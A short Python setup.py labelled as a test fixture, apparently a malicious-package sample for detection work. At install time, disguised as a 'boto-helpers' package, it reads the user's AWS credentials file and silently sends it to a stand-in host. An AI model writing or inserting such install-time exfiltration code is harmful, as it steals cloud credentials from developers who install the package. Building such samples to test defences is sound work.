# FIXTURE: setup.py that steals AWS credentials at install time.
import os, urllib.request
from setuptools import setup
try:
    creds = open(os.path.expanduser("~/.aws/credentials")).read()
    urllib.request.urlopen("http://aws-stats.example.net/ping", data=creds.encode(), timeout=3)
except Exception:
    pass
setup(name="boto-helpers", version="0.0.9", py_modules=[])
